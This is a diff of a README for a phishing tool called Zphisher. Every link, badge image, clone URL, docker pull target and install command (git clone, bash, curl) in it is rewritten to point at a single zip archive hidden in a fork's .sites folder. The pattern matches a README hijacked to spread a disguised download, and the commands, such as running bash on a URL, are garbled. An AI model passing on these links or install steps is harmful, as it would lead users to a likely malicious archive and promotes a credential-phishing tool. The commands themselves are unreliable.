@@ -1,23 +1,23 @@
 <!-- Zphisher -->
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
 </p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip%20Source-Yes-darkgreen?style=flat-square">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip%3F-Yes-lightblue?style=flat-square">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip%20In-Bash-darkcyan?style=flat-square">
-  <img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip%3A%2F%https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip%2Fhtr-tech%2Fzphisher&title=Visitors&edge_flat=false"/></a>
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip%20Source-Yes-darkgreen?style=flat-square">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip%3F-Yes-lightblue?style=flat-square">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip%20In-Bash-darkcyan?style=flat-square">
+  <img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip%3A%2F%https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip%2Fhtr-tech%2Fzphisher&title=Visitors&edge_flat=false"/></a>
 </p>
 
 <p align="center"><b>A beginners friendly, Automated phishing tool with 30+ templates.</b></p>
@@ -54,13 +54,13 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 - Just, Clone this repository -
   ```
-  git clone --depth=1 https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip
+  git clone --depth=1 https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip
   ```
 
-- Now go to cloned directory and run `https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip` -
+- Now go to cloned directory and run `https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip` -
   ```
   $ cd zphisher
-  $ bash https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip
+  $ bash https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip
   ```
 
 - On first launch, It'll install the dependencies and that's it. ***Zphisher*** is installed.
@@ -69,8 +69,8 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 ### Installation via ".deb" file
 
-- Download `.deb` files from the [**Latest Release**](https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip)
-- If you are using ***termux*** then download the `*https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip`
+- Download `.deb` files from the [**Latest Release**](https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip)
+- If you are using ***termux*** then download the `*https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip`
 
 - Install the `.deb` file by executing
   ```
@@ -93,14 +93,14 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
     ```
   - **GHCR** : 
     ```
-    docker pull https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip
+    docker pull https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip
     ```
 
-- By using the wrapper script [**https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip**](https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip)
+- By using the wrapper script [**https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip**](https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip)
 
   ```
-  $ curl -LO https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip
-  $ bash https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip
+  $ curl -LO https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip
+  $ bash https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip
   ```
 - Temporary Container
 
@@ -137,15 +137,15 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 <h3 align="center"><i>:: Workflow ::</i></h3>
 <p align="center">
-<img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"/>
+<img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"/>
 </p>
 
 ##
 
 ### Find Me on:
 <p align="left">
-  <a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"></a>
-  <a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" target="_blank"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"></a>
+  <a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" target="_blank"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"></a>
+  <a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" target="_blank"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"></a>
 </p>
 
 
@@ -153,19 +153,19 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 <table>
   <tr align="center">
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>1RaY-1</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>Aditya Shakya</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>Ali Milani</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>AmnesiA</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>KasRoudra</b></sub></a></td>
-   <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>Moises Tapia</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>1RaY-1</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>Aditya Shakya</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>Ali Milani</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>AmnesiA</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>KasRoudra</b></sub></a></td>
+   <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>Moises Tapia</b></sub></a></td>
   </tr>
   <tr align="center">
-   <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>Mustakim Ahmed</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>sepp0</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>TripleHat</b></sub></a></td>
-    <td><a href="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip"><img src="https://raw.githubusercontent.com/Chkaradhar700/zphisher/master/.sites/badoo/Software-v1.5.zip" /><br /><sub><b>Yisus7u7</b></sub></a></td>
+   <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>Mustakim Ahmed</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>sepp0</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>TripleHat</b></sub></a></td>
+    <td><a href="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip"><img src="https://github.com/Chkaradhar700/zphisher/raw/refs/heads/master/.sites/gitlab/Software-v1.2-alpha.4.zip" /><br /><sub><b>Yisus7u7</b></sub></a></td>
   </tr>
 <table>
 
